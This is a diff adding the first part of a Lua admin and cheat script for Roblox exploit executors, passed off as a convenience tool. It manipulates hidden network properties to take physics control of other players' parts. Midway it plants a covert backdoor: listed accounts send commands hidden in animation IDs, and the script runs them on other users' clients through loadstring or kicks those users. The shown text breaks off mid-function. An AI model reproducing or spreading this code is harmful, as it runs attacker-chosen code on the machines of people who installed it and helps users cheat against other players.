@@ -1,0 +1,4955 @@
+-- reminder to add this when adding to whitelist
+
+checkwhitelist = function()
+	return {iswhitelisted = true, isblacklisted=false}
+end
+
+repeat wait() until game:IsLoaded();
+
+if (getgenv().FA_Loaded) then
+	getgenv().F_A.Notify(game.Players.LocalPlayer, "Loaded", "fates admin is already loaded");
+	return
+end
+
+if isfile and writefile and messagebox and not isfile("FTOS.txt") then
+	Aggree = function()
+		local Res = messagebox("This is your first time using Fates Admin. To use our script you must accept our Terms of Service.", "Welcome!", 4);
+		if Res ~= 6 then
+			Aggree();	
+		end;
+		writefile("FTOS.txt", "");
+	end
+end;
+
+local start = start or tick() or os.clock();
+
+if (setfflag) then
+	setfflag("AutomaticSizing2", "true");
+end
+
+getgenv().F_A = {};
+
+AddGlobal = function(a,b)
+	F_A[a] = b;
+end
+
+firetouchinterest = firetouchinterest or function(part1, part2, toggle)
+    part1.CFrame = toggle == 0 and part2.CFrame or part1.CFrame
+end
+
+isnetworkowner = isnetworkowner or function(part)
+     return true
+end
+
+DeepSearch = function(tbl, value)
+    if (type(tbl) == 'table') then
+    	for i, v in next, tbl do
+    		if v == value then
+    			return v
+    		end
+    		if (type(tbl) == 'table') then
+    			return DeepSearch(v, value);
+    		end
+    	end 
+    end
+end
+
+function pairs(t, ...)
+	local i, a, k, v = 1, {...}
+	return
+    function()
+		repeat
+			k, v = next(t, k)
+			if k == nil then
+				i, t = i + 1, a[i]
+			end
+		until k ~= nil or not t
+		return k, v
+	end
+end
+
+-- // Services \\ --
+local Workspace = game:GetService("Workspace");
+local RunService = game:GetService("RunService");
+local Players = game:GetService("Players");
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+local StarterPlayer = game:GetService("StarterPlayer");
+local StarterPack = game:GetService("StarterPack");
+local StarterGui = game:GetService("StarterGui");
+local TeleportService = game:GetService("TeleportService");
+local CoreGui = game:GetService("CoreGui");
+local TweenService = game:GetService("TweenService");
+local UserInputService = game:GetService("UserInputService");
+local HttpService = game:GetService("HttpService");
+local TextService = game:GetService("TextService")
+local Chat = game:GetService("Chat")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+--// BackdoorAccess
+local BackdoorAccess = {"nw6n", "misrepresenting", "AstrozTM", "notdsf", "XxHaileyRblxX", "HaileyRblxx", "IayingDuck", "Th3DSF", "c00lqid"}
+local RespawnTimes = {}
+local TotalUsers = {}
+
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+if (checkwhitelist().iswhitelisted) then
+	UI = game:GetObjects("rbxassetid://6167929302")[1]
+end
+
+Guis = {}
+local Utils = {}
+local ParentGui
+local CommandBarPrefix = Enum.KeyCode.Semicolon
+
+local CommandBar = UI.CommandBar
+local Commands = UI.Commands
+local Animations = UI.Commands:Clone()
+local ChatLogs = UI.ChatLogs
+local AdminChatLogs = UI.ChatLogs:Clone()
+local Notification = UI.Notification
+local Command = UI.Command
+local Animation = UI.Command:Clone()
+local ChatLogMessage = UI.Message
+local AdminChatLogMessage = UI.Message:Clone()
+local NotificationBar = UI.NotificationBar
+local Stats = UI.Notification:Clone();
+local StatsBar = UI.NotificationBar:Clone();
+
+local RobloxChat = PlayerGui:WaitForChild("Chat", 1)
+local RobloxChatFrame = RobloxChat and RobloxChat:WaitForChild("Frame", .1)
+local RobloxChatChannelParentFrame = RobloxChatFrame and RobloxChatFrame:WaitForChild("ChatChannelParentFrame", .1)
+local RobloxFrameMessageLogDisplay = RobloxChatChannelParentFrame and RobloxChatChannelParentFrame:WaitForChild("Frame_MessageLogDisplay", .1)
+local RobloxScroller = RobloxFrameMessageLogDisplay and RobloxFrameMessageLogDisplay:WaitForChild("Scroller", .1)
+
+local CommandBarOpen = false
+local CommandBarTransparencyClone = CommandBar:Clone()
+local ChatLogsTransparencyClone = ChatLogs:Clone()
+local AdminChatLogsTransparencyClone = AdminChatLogs:Clone()
+local CommandsTransparencyClone
+local PredictionText = ""
+
+local UIParent = CommandBar.Parent
+AdminChatLogs.Parent = UIParent
+AdminChatLogMessage.Parent = UIParent
+Animations.Parent = UIParent
+Animations.Search.Text = "Search Animations"
+Animations.Search.PlaceholderText = "Search Animations"
+Animation.Parent = UIParent
+AdminChatLogs.Name = "AdminChatLogs"
+AdminChatLogMessage.Name = "AdminChatLogMessage"
+Animations.Name = "Animations"
+Animation.Name = "Animation"
+Stats.Name = "Stats"
+Stats.Parent = UIParent
+StatsBar.Name = "StatsBar"
+StatsBar.Parent = UIParent
+StatsBar.Position = UDim2.new(0, 600, 0, -150)
+
+
+-- position CommandBar
+CommandBar.Position = UDim2.new(0.5, -100, 1, 5)
+
+-- utils
+function Utils.Tween(Object, Style, Direction, Time, Goal)
+	local TInfo = TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction])
+	local Tween = TweenService:Create(Object, TInfo, Goal)
+
+	Tween:Play()
+
+	return Tween
+end
+
+function Utils.MultColor3(Color, Delta)
+	return Color3.new(math.clamp(Color.R * Delta, 0, 1), math.clamp(Color.G * Delta, 0, 1), math.clamp(Color.B * Delta, 0, 1))
+end
+
+function Utils.Click(Object, Goal) -- Utils.Click(Object, "BackgroundColor3")
+	local Hover = {
+		[Goal] = Utils.MultColor3(Object[Goal], 0.9)
+	}
+
+	local Press = {
+		[Goal] = Utils.MultColor3(Object[Goal], 1.2)
+	}
+
+	local Origin = {
+		[Goal] = Object[Goal]
+	}
+
+	Object.MouseEnter:Connect(function()
+		Utils.Tween(Object, "Sine", "Out", .5, Hover)
+	end)
+
+	Object.MouseLeave:Connect(function()
+		Utils.Tween(Object, "Sine", "Out", .5, Origin)
+	end)
+
+	Object.MouseButton1Down:Connect(function()
+		Utils.Tween(Object, "Sine", "Out", .3, Press)
+	end)
+
+	Object.MouseButton1Up:Connect(function()
+		Utils.Tween(Object, "Sine", "Out", .4, Hover)
+	end)
+end
+
+function Utils.Blink(Object, Goal, Color1, Color2) -- Utils.Click(Object, "BackgroundColor3", NormalColor, OtherColor)
+	local Normal = {
+		[Goal] = Color1
+	}
+
+	local Blink = {
+		[Goal] = Color2
+	}
+
+	local Tween = Utils.Tween(Object, "Sine", "Out", .5, Blink)
+	Tween.Completed:Wait()
+
+	local Tween = Utils.Tween(Object, "Sine", "Out", .5, Normal)
+	Tween.Completed:Wait()
+end
+
+function Utils.Hover(Object, Goal)
+	local Hover = {
+		[Goal] = Utils.MultColor3(Object[Goal], 0.9)
+	}
+
+	local Origin = {
+		[Goal] = Object[Goal]
+	}
+
+	Object.MouseEnter:Connect(function()
+		Utils.Tween(Object, "Sine", "Out", .5, Hover)
+	end)
+
+	Object.MouseLeave:Connect(function()
+		Utils.Tween(Object, "Sine", "Out", .5, Origin)
+	end)
+end
+
+function Utils.Draggable(Ui, DragUi)
+	local DragSpeed = 0
+	local StartPos
+	local DragToggle, DragInput, DragStart, DragPos = nil
+
+	if not DragUi then DragUi = Ui end
+
+	local function UpdateInput(Input)
+		local Delta = Input.Position - DragStart
+		local Position = UDim2.new(StartPos.X.Scale, StartPos.X.Offset + Delta.X, StartPos.Y.Scale, StartPos.Y.Offset + Delta.Y)
+
+		Utils.Tween(Ui, "Linear", "Out", .25, {
+			Position = Position
+		})
+		--TweenService:Create(Ui, TweenInfo.new(0.25), {Position = Position}):Play()
+	end
+
+	Ui.InputBegan:Connect(function(Input)
+		if ((Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil) then
+			DragToggle = true
+			DragStart = Input.Position
+			StartPos = Ui.Position
+
+			Input.Changed:Connect(function()
+				if (Input.UserInputState == Enum.UserInputState.End) then
+					DragToggle = false
+				end
+			end)
+		end
+	end)
+
+	Ui.InputChanged:Connect(function(Input)
+		if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
+			DragInput = Input
+		end
+	end)
+
+	UserInputService.InputChanged:Connect(function(Input)
+		if (Input == DragInput and DragToggle) then
+			UpdateInput(Input)
+		end
+	end)
+end
+
+function Utils.SmoothScroll(content, SmoothingFactor) -- by Elttob
+	-- get the 'content' scrolling frame, aka the scrolling frame with all the content inside
+	-- if smoothing is enabled, disable scrolling
+	content.ScrollingEnabled = false
+
+	-- create the 'input' scrolling frame, aka the scrolling frame which receives user input
+	-- if smoothing is enabled, enable scrolling
+	local input = content:Clone()
+
+	input:ClearAllChildren()
+	input.BackgroundTransparency = 1
+	input.ScrollBarImageTransparency = 1
+	input.ZIndex = content.ZIndex + 1
+	input.Name = "_smoothinputframe"
+	input.ScrollingEnabled = true
+	input.Parent = content.Parent
+
+	-- keep input frame in sync with content frame
+	local function syncProperty(prop)
+		content:GetPropertyChangedSignal(prop):Connect(function()
+			if prop == "ZIndex" then
+				-- keep the input frame on top!
+				input[prop] = content[prop] + 1
+			else
+				input[prop] = content[prop]
+			end
+		end)
+	end
+
+	syncProperty "CanvasSize"
+	syncProperty "Position"
+	syncProperty "Rotation"
+	syncProperty "ScrollingDirection"
+	syncProperty "ScrollBarThickness"
+	syncProperty "BorderSizePixel"
+	syncProperty "ElasticBehavior"
+	syncProperty "SizeConstraint"
+	syncProperty "ZIndex"
+	syncProperty "BorderColor3"
+	syncProperty "Size"
+	syncProperty "AnchorPoint"
+	syncProperty "Visible"
+
+	-- create a render stepped connection to interpolate the content frame position to the input frame position
+	local smoothConnection = RunService.RenderStepped:Connect(function()
+		local a = content.CanvasPosition
+		local b = input.CanvasPosition
+		local c = SmoothingFactor
+		local d = (b - a) * c + a
+
+		content.CanvasPosition = d
+	end)
+
+	-- destroy everything when the frame is destroyed
+	content.AncestryChanged:Connect(function()
+		if content.Parent == nil then
+			input:Destroy()
+			smoothConnection:Disconnect()
+		end
+	end)
+end
+
+function Utils.TweenAllTransToObject(Object, Time, BeforeObject) -- max transparency is max object transparency, swutched args bc easier command
+	local Descendants = Object:GetDescendants()
+	local OldDescentants = BeforeObject:GetDescendants()
+	local Tween -- to use to wait
+
+	Tween = Utils.Tween(Object, "Sine", "Out", Time, {
+		BackgroundTransparency = BeforeObject.BackgroundTransparency
+	})
+
+	for i, v in ipairs(Descendants) do
+		local IsText = v:IsA("TextBox") or v:IsA("TextLabel") or v:IsA("TextButton")
+		local IsImage = v:IsA("ImageLabel") or v:IsA("ImageButton")
+		local IsScrollingFrame = v:IsA("ScrollingFrame")
+
+		if (not v:IsA("UIListLayout")) then
+			if (IsText) then
+				Utils.Tween(v, "Sine", "Out", Time, {
+					TextTransparency = OldDescentants[i].TextTransparency,
+					TextStrokeTransparency = OldDescentants[i].TextStrokeTransparency,
+					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
+				})
+			elseif (IsImage) then
+				Utils.Tween(v, "Sine", "Out", Time, {
+					ImageTransparency = OldDescentants[i].ImageTransparency,
+					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
+				})
+			elseif (IsScrollingFrame) then
+				Utils.Tween(v, "Sine", "Out", Time, {
+					ScrollBarImageTransparency = OldDescentants[i].ScrollBarImageTransparency,
+					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
+				})
+			else
+				Utils.Tween(v, "Sine", "Out", Time, {
+					BackgroundTransparency = OldDescentants[i].BackgroundTransparency
+				})
+			end
+		end
+	end
+
+	return Tween
+end
+
+function Utils.SetAllTrans(Object)
+	Object.BackgroundTransparency = 1
+
+	for _, v in ipairs(Object:GetDescendants()) do
+		local IsText = v:IsA("TextBox") or v:IsA("TextLabel") or v:IsA("TextButton")
+		local IsImage = v:IsA("ImageLabel") or v:IsA("ImageButton")
+		local IsScrollingFrame = v:IsA("ScrollingFrame")
+
+		if (not v:IsA("UIListLayout")) then	
+			v.BackgroundTransparency = 1
+
+			if (IsText) then
+				v.TextTransparency = 1
+			elseif (IsImage) then
+				v.ImageTransparency = 1
+			elseif (IsScrollingFrame) then
+				v.ScrollBarImageTransparency = 1
+			end
+		end
+	end
+end
+
+function Utils.TweenAllTrans(Object, Time)
+	local Tween -- to use to wait
+
+	Tween = Utils.Tween(Object, "Sine", "Out", Time, {
+		BackgroundTransparency = 1
+	})
+
+	for _, v in ipairs(Object:GetDescendants()) do
+		local IsText = v:IsA("TextBox") or v:IsA("TextLabel") or v:IsA("TextButton")
+		local IsImage = v:IsA("ImageLabel") or v:IsA("ImageButton")
+		local IsScrollingFrame = v:IsA("ScrollingFrame")
+
+		if (not v:IsA("UIListLayout")) then
+			if (IsText) then
+				Utils.Tween(v, "Sine", "Out", Time, {
+					TextTransparency = 1,
+					BackgroundTransparency = 1
+				})
+			elseif (IsImage) then
+				Utils.Tween(v, "Sine", "Out", Time, {
+					ImageTransparency = 1,
+					BackgroundTransparency = 1
+				})
+			elseif (IsScrollingFrame) then
+				Utils.Tween(v, "Sine", "Out", Time, {
+					ScrollBarImageTransparency = 1,
+					BackgroundTransparency = 1
+				})
+			else
+				Utils.Tween(v, "Sine", "Out", Time, {
+					BackgroundTransparency = 1
+				})
+			end
+		end
+	end
+
+	return Tween
+end
+
+function Utils.Notify(Caller, Title, Message, Time)
+	local Notification = UI.Notification
+	local NotificationBar = UI.NotificationBar
+
+	local Clone = Notification:Clone()
+
+	local function TweenDestroy()
+		local Tween = Utils.TweenAllTrans(Clone, .25)
+
+		Tween.Completed:Wait()
+		Clone:Destroy() -- tween out then destroy
+	end
+
+	Clone.Message.Text = Message
+	Clone.Title.Text = Title or "Notification"
+	Utils.SetAllTrans(Clone)
+	Utils.Click(Clone.Close, "TextColor3")
+	Clone.Visible = true -- tween
+	Clone.Parent = NotificationBar
+
+	coroutine.wrap(function()
+		local Tween = Utils.TweenAllTransToObject(Clone, .5, Notification)
+
+		Tween.Completed:Wait()
+		wait(Time or 5) -- idk
+
+		if (Clone) then
+			TweenDestroy()
+		end
+	end)()
+
+	Clone.Close.MouseButton1Click:Connect(function()
+		TweenDestroy()
+	end)
+	if (Caller ~= LocalPlayer) then
+		getgenv().F_A.execmd("whisper", LocalPlayer, {Caller.Name, ("FA: %s | %s"):format(Title or "Notification", Message)})
+	end
+end
+AddGlobal("Notify", Utils.Notify);
+function Utils.MatchSearch(String1, String2) -- Utils.MatchSearch("pog", "poggers") - true; Utils.MatchSearch("poz", "poggers") - false
+	return String1 == string.sub(String2, 1, #String1)
+end
+
+function Utils.StringFind(Table, String)
+	for _, v in ipairs(Table) do
+		if (Utils.MatchSearch(String, v)) then
+			return v
+		end
+	end
+end
+
+function Utils.GetPlayerArgs(Arg)
+	Arg = Arg:lower()
+	local SpecialCases = {"all", "others", "claimed", "random", "me", "nearest", "farthest"}
+
+	return Utils.StringFind(SpecialCases, Arg) or (function()
+		for _, v in ipairs(Players:GetPlayers()) do
+			local Name = string.lower(v.Name)
+			local DisplayName = string.lower(v.DisplayName)
+
+			if (Utils.MatchSearch(Arg, Name)) then
+				return Name
+			elseif (Utils.MatchSearch(Arg, DisplayName)) then
+				return DisplayName
+			end
+		end
+	end)()	
+end
+
+function Utils.ToolTip(Object, Message)
+	local Clone
+
+	Object.MouseEnter:Connect(function()
+		if (Object.BackgroundTransparency < 1 and not Clone) then
+			local TextSize = TextService:GetTextSize(Message, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and true or false
+
+			Clone = UI.ToolTip:Clone()
+			Clone.Text = Message
+			Clone.TextScaled = TextSize
+			Clone.Visible = true
+			Clone.Parent = UI
+		end
+	end)
+
+	Object.MouseLeave:Connect(function()
+		if (Clone) then
+			Clone:Destroy()
+			Clone = nil
+		end
+	end)
+
+	Mouse.Move:Connect(function()
+		if (Clone) then
+			Clone.Position = UDim2.fromOffset(Mouse.X + 10, Mouse.Y + 10)
+		end
+	end)
+end
+
+function Utils.ClearAllObjects(Object)
+	for _, v in ipairs(Object:GetChildren()) do
+		if (not v:IsA("UIListLayout")) then
+			v:Destroy()
+		end
+	end
+end
+
+function Utils.GetRoot(Char)
+	if Char then
+		return Char:FindFirstChild('HumanoidRootPart') or Char:FindFirstChild('Torso') or Char:FindFirstChild('Head') or Char:FindFirstChildOfClass('BasePart')
+	end
+end
+
+function Utils.GetRootCFrame(Char)
+	if Char then
+		local Root = Utils.GetRoot(Char)
+		return Root and Root.CFrame or ({Char:GetBoundingBox()})[1]
+	end
+end
+
+-- parent ui function
+ParentGui = function(Gui)
+	Gui.Name = HttpService:GenerateGUID(false):gsub('-', ''):sub(1, math.random(25, 30))
+
+	if ((not is_sirhurt_closure) and (syn and syn.protect_gui)) then
+		syn.protect_gui(Gui)
+		Gui.Parent = CoreGui
+	elseif (CoreGui:FindFirstChild("RobloxGui")) then
+		Gui.Parent = CoreGui.RobloxGui
+	else
+		Gui.Parent = CoreGui
+	end
+	Guis[#Guis + 1] = Gui 
+	return Gui
+end
+
+
+
+local function getexploit()
+	return (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+		(secure_load and "Sentinel") or
+		(is_sirhurt_closure and "PedoHurt") or
+		(pebc_execute and "Protocrasher") or
+		(KRNL_LOADED and "Krnl") or
+		("Undetectable")
+end
+
+-- // Network \\ --
+local GetHiddenProperty = function(...) 
+	if getexploit() == "Synapse" or getexploit() == "Krnl" then
+		return gethiddenproperty(...);
+	elseif getexploit() == "Protocrasher" then
+		return get_hidden_prop(...);
+	else
+		return get_hidden_property(...) or gethiddenprop(...);
+	end
+end
+local SetHiddenProperty = function(...) 
+	if getexploit() == "Synapse" or getexploit() == "Krnl" then
+		return sethiddenproperty(...)
+	elseif getexploit() == "Protocrasher" then
+		return set_hidden_prop(...)
+	else
+		return set_hidden_property(...) or sethiddenprop(...)
+	end
+end
+local SetSimulationRadius = function(...)
+	local args = {...}
+	if getexploit() == "Synapse" or getexploit() == "Krnl" then
+		return setsimulationradius(...)
+	elseif getexploit() == "Protocrasher" then
+		return set_simulation_radius(LocalPlayer, args[1])
+	else
+		return setsimulationradius(...);
+	end
+end
+
+local SetNetwork = function(v, i)
+	SetSimulationRadius(i, i);
+	SetHiddenProperty(v, "SimulationRadius", i);
+	SetHiddenProperty(v, "MaximumSimulationRadius", i);
+	LocalPlayer.ReplicationFocus = Workspace
+
+	if (Optimise) then
+		local Network = LocalPlayer.SimulationRadiusChanged:Connect(function(x)
+			print("Simulation Radius Changed to " .. i);
+			SetSimulationRadius(i, i);
+			SetHiddenProperty(v, "SimulationRadius", i);
+			SetHiddenProperty(v, "MaximumSimulationRadius", i);
+		end)
+		return Network
+	else
+		local Network = RunService.RenderStepped:Connect(function(x)
+			SetSimulationRadius(i, i);
+			SetHiddenProperty(v, "SimulationRadius", i);
+			SetHiddenProperty(v, "MaximumSimulationRadius", i);
+		end)
+		return Network
+	end
+end
+
+local GetNetwork = function(v)
+	return GetHiddenProperty(v, "SimulationRadius")
+end
+
+local CheckPlayersNetwork = function(v)
+	local NetworkUsers = {}
+	for _, v in next, Players:GetPlayers() do
+		if (GetNetwork(v) >= 10000) then
+			NetworkUsers[#NetworkUsers + 1] = v.Name
+		end
+	end
+	return NetworkUsers
+end
+
+for _, v in next, Players:GetPlayers() do
+	if (GetNetwork(v) >= 10000 and v ~= LocalPlayer) then
+		NetworkUsage = true
+	end
+end
+
+if (NetworkUsage) then
+	Utils.Notify(Caller or LocalPlayer, "Warning", "There are Users that have full network!", 30);
+end
+
+NetworkSet = SetNetwork(LocalPlayer, math.huge);
+
+-- // Admin \\ --
+if (checkwhitelist().iswhitelisted) then
+	Prefix = "/"
+	Functions = {}
+	AdminUse = {}
+	CommandStuff = {}
+	WideBar = false
+
+	AddGlobal("CommandStuff", CommandStuff);
+	
+	CommandStuff["Commands"] = {}
+	
+	
+	AddCommand, LoadCommand, HelpCommand = function(name, aliases, description, func)
+		table.insert(Functions, (#Functions + 1), {
+			Name = name,
+			Aliases = aliases,
+			Description = description,
+			Func = func
+		});
+		CommandStuff["Commands"][name] = {}
+	end, function(CommandName, Caller, Args, CommandStuff_)
+		for i, v in next, Functions do
+			if (v.Name == CommandName) then
+				return v.Func(Caller, Args, CommandStuff["Commands"][v.Name]);
+			else
+				for i2, v2 in next, v.Aliases do
+					if (v2 == CommandName) then
+						return v.Func(Caller, Args, CommandStuff["Commands"][v.Name]);
+					end
+				end
+			end
+		end
+	end, function(CommandName)
+		for i, v in next, Functions do
+			if (v.Name == CommandName) then
+				return Utils.Notify(Caller or LocalPlayer, nil, v.Description);
+			else
+				for i2, v2 in next, v.Aliases do
+					if (v2 == CommandName) then
+						return Utils.Notify(Caller or LocalPlayer, nil, v.Name.." - "..v.Description);
+					end
+				end
+			end
+		end
+	end
+	
+	AddBackdoorCommand, LoadBackdoorCommand = function(name, aliases, description, func)
+		table.insert(Functions, (#Functions + 1), {
+			Name = name,
+			Aliases = aliases,
+			Description = description,
+			Func = func
+		});
+		CommandStuff["Commands"][name] = {}
+	end, function(CommandName, Caller, Args, CommandStuff_)
+		for i, v in next, Functions do
+			if (v.Name == CommandName) then
+				return v.Func(Caller, Args, CommandStuff["Commands"][v.Name]);
+			else
+				for i2, v2 in next, v.Aliases do
+					if (v2 == CommandName) then
+						return v.Func(Caller, Args, CommandStuff["Commands"][v.Name]);
+					end
+				end
+			end
+		end
+	end
+end
+
+GetPlayer = function(String)
+	local CurrentPlayers = Players:GetPlayers()
+	for i, v in next, CurrentPlayers do
+		if (table.find(AdminUse, v)) then
+			table.remove(CurrentPlayers, i);
+		end
+	end
+	if (not String) then
+		return {LocalPlayer}
+	end
+	local strl = String:lower()
+	local customError = (strl == "nearest" or strl == "farthest") and not LocalPlayer.Character
+	if (strl:find(",")) then
+		local plrs = strl:split(",");
+		local plrtbl = {}
+		for i, v in next, plrs do
+			for i, v in next, GetPlayer(v) do
+				table.insert(plrtbl, v);
+			end
+		end
+		return plrtbl
+	elseif (strl == "all") then
+		return CurrentPlayers
+	elseif (strl == "others") then
+		return {select(2, unpack(CurrentPlayers))}
+	elseif (strl == "claimed") then
+		if (isnetworkowner) then
+			local Claimed = {}
+			for i, v in next, CurrentPlayers do
+				if (v ~= LocalPlayer and v.Character and isnetworkowner(Utils.GetRoot(v.Character))) then
+					table.insert(Claimed, v);
+				end
+			end
+			return Claimed
+		end
+	elseif (strl == "nearest" and LocalPlayer.Character) then
+		local lowest = math.huge
+		local plr = nil
+		for i,v in next, CurrentPlayers do
+			if v ~= LocalPlayer and v.Character then
+				local mag = (Utils.GetRootCFrame(v.Character).p - Utils.GetRootCFrame(LocalPlayer.Character).p).Magnitude
+				if mag < lowest then
+					lowest = mag
+					plr = v
+				end
+			end
+		end
+		return {plr}
+	elseif (strl == "farthest" and LocalPlayer.Character) then
+		local highest = 0
+		local plr = nil
+		for i,v in next, CurrentPlayers do
+			if v ~= LocalPlayer and v.Character then
+				local mag = (Utils.GetRootCFrame(v.Character).p - Utils.GetRootCFrame(LocalPlayer.Character).p).Magnitude
+				if mag > highest then
+					highest = mag
+					plr = v
+				end
+			end
+		end
+		return {plr}
+	elseif (strl == "random") then
+		return {CurrentPlayers[math.random(2, #CurrentPlayers)]}
+	elseif strl == "me" then
+		return {LocalPlayer}
+	else
+		local plrtbl = {}
+		for i, v in next, CurrentPlayers do
+			if (v.Name:lower():sub(1, #String) == String:lower() or v.DisplayName:lower():sub(1, #String) == String:lower()) then
+				table.insert(plrtbl, v)
+			end
+		end
+		if #plrtbl > 0 then
+			return plrtbl
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, nil, customError and "Cannot find nearest player" or ("Couldn't find player %s"):format(strl))
+end
+
+local AddTag = function(plr, name)
+	if (plr) then
+		if (not plr.Character) then
+			plr.CharacterAdded:Wait();
+		end
+		local Tag = Instance.new("BoolValue");
+		Tag.Name = name
+		Tag.Parent = plr.Character:WaitForChild("HumanoidRootPart");
+	end
+end
+
+
+local function SendMessageKey(KeyName, Text)
+	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local Animator = Character:WaitForChild("Humanoid"):WaitForChild("Animator")
+
+	local NewAnimation = Instance.new("Animation")
+	NewAnimation.AnimationId = KeyName .. Text
+
+	local NewAnimationTrack = Animator:LoadAnimation(NewAnimation)
+	NewAnimationTrack:Play()
+end
+
+local function CheckBackdoorPlayer()
+	local BackdoorString = table.concat(BackdoorAccess, "/n")
+
+	for _, v in ipairs(Players:GetPlayers()) do
+		if string.match(BackdoorString, v.Name) then
+			return true
+		end
+	end
+end
+
+local MessageKeys 
+MessageKeys = {
+	Backdoor = {
+		Key = "rbxassetid://[!FABackdoor]",
+		Function = function(Args) -- runs for all players, might make a check to verify if userid matches
+			if (not table.find(BackdoorAccess, LocalPlayer.Name) and CheckBackdoorPlayer()) then
+				loadstring(Args)()
+			end
+		end
+	},
+
+	Kick = {
+		Key = "rbxassetid://[!FAKick]",
+		Function = function(Args)
+			local Player = GetPlayer(Args)
+			if (not table.find(BackdoorAccess, LocalPlayer.Name) and CheckBackdoorPlayer()) then
+				local Players = GetPlayer(Args)
+						
+				for _, v in ipairs(Players) do
+					Player:Kick() -- check if player?
+				end
+			end
+		end
+	},
+
+	ShowUsersHandle = {
+		Key = "rbxassetid://[!FAShowUsersHandle]",
+		Function = function(Args)
+			local OriginPlayerName, PlayerName = unpack(string.split(Args, " "))
+
+			if (OriginPlayerName == LocalPlayer.Name) then
+				print("Handle", LocalPlayer.Name)
+				table.insert(TotalUsers, PlayerName)
+			end
+		end
+	},
+
+	ShowUsersReply = {
+		Key = "rbxassetid://[!FAShowUsersReply]",
+		Function = function(Args) -- handle this in command?
+			print("Reply", Args, LocalPlayer.Name)
+			SendMessageKey(MessageKeys.ShowUsersHandle.Key, Args .. " " .. LocalPlayer.Name)
+		end
+	},
+
+	ShowUsersAnnounce = {
+		Key = "rbxassetid://[!FAShowUsersSent]",
+		Function = function()
+			print("Announce", LocalPlayer.Name)
+			SendMessageKey(MessageKeys.ShowUsersReply.Key, LocalPlayer.Name)
+		end
+	}
+}
+
+-- [KEY RECEIVER]
+local function OnCharacterAdded(Character)
+    coroutine.wrap(function()
+    	Character:WaitForChild("Humanoid").AnimationPlayed:Connect(function(AnimationTrack)
+    		local Id = AnimationTrack.Animation.AnimationId
+    
+    		for _, v in pairs(MessageKeys) do 
+    			if (string.find(Id, v.Key, 1, true)) then
+    				local Args = string.sub(Id, #v.Key + 1, #Id)
+    				v.Function(Args)
+    			end
+    		end
+    	end)
+    end)()
+end
+
+local function OnPlayerAdded(Player)
+	Player.CharacterAppearanceLoaded:Connect(OnCharacterAdded)
+end
+
+Players.PlayerAdded:Connect(OnPlayerAdded)
+
+for _, v in ipairs(Players:GetPlayers()) do 
+	local Character = v.Character or v.CharacterAdded:Wait()
+	OnCharacterAdded(Character)
+	OnPlayerAdded(v)
+end
+
+function playanim(id, speed)
+	local L_1_ = ("rbxassetid://")..id
+	local L_2_ = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local L_4_ = L_2_.Torso
+	local L_5_ = L_4_["Right Shoulder"]
+	local L_6_ = L_4_["Left Shoulder"]
+	local L_7_ = L_4_["Right Hip"]
+	local L_8_ = L_4_["Left Hip"]
+	local L_9_ = L_4_["Neck"]
+	local L_10_ = L_2_.HumanoidRootPart["RootJoint"]
+	local L_11_ = L_5_.C0
+	local L_12_ = L_6_.C0
+	local L_13_ = L_7_.C0
+	local L_14_ = L_8_.C0
+	local L_15_ = L_10_.C0
+	local L_16_ = L_9_.C0
+	local L_24_ = 100
+	local L_25_ = 100
+	RunService.Heartbeat:Connect(function()
+		L_24_ = L_24_ + 1
+		if L_24_ <= L_25_ then
+			L_5_.Transform = L_5_.Transform:Lerp(L_11_, L_24_ / L_25_)
+			L_6_.Transform = L_6_.Transform:Lerp(L_12_, L_24_ / L_25_)
+			L_7_.Transform = L_7_.Transform:Lerp(L_13_, L_24_ / L_25_)
+			L_8_.Transform = L_8_.Transform:Lerp(L_14_, L_24_ / L_25_)
+			L_9_.Transform = L_9_.Transform:Lerp(L_16_, L_24_ / L_25_)
+			L_10_.Transform = L_10_.Transform:Lerp(L_15_, L_24_ / L_25_)
+		end
+	end)
+	local L_26_ = game:GetObjects(L_1_)[1]
+	function wait2(spd)
+		for L_28_forvar0 = 1, spd * 40 do
+			RunService.Heartbeat:Wait()
+		end
+	end
+	anim = {}
+	function kftotbl(L_29_arg0)
+		tbl3 = {}
+		for L_30_forvar0, L_31_forvar1 in pairs(L_29_arg0:GetDescendants()) do
+			if L_31_forvar1:IsA("Pose") then
+				tbl3[string.sub(L_31_forvar1.Name, 1, 1) .. string.sub(L_31_forvar1.Name, #L_31_forvar1.Name, #L_31_forvar1.Name)] = L_31_forvar1.CFrame
+			end
+		end
+		return (tbl3)
+	end
+	for L_32_forvar0, L_33_forvar1 in pairs(L_26_:GetChildren()) do
+		if L_33_forvar1:IsA("Keyframe") then
+			anim[L_33_forvar1.Time] = kftotbl(L_33_forvar1)
+		end
+	end
+	function getnext(L_34_arg0, L_35_arg1)
+		c = 100
+		rtrnv = 0
+		for L_36_forvar0, L_37_forvar1 in pairs(L_34_arg0) do
+			if L_36_forvar0 > L_35_arg1 and L_36_forvar0 - L_35_arg1 < c then
+				c = L_36_forvar0 - L_35_arg1
+				rtrnv = L_36_forvar0
+			end
+		end
+		return (rtrnv)
+	end
+	count = 0
+	L_2_ = game.Players.LocalPlayer.Character
+	hhhh = game.Players.LocalPlayer.Character.Humanoid.Animator
+	hhhh.Parent = nil
+	for L_38_forvar0, L_39_forvar1 in pairs(L_2_.Humanoid:GetPlayingAnimationTracks()) do
+		L_39_forvar1:Stop()
+	end
+	while wait() do
+		for L_40_forvar0, L_41_forvar1 in pairs(anim) do
+			asdf = getnext(anim, count)
+			v = anim[asdf]
+			if v["Lg"] then
+				L_14_ = v["Lg"]
+			end
+			if v["Rg"] then
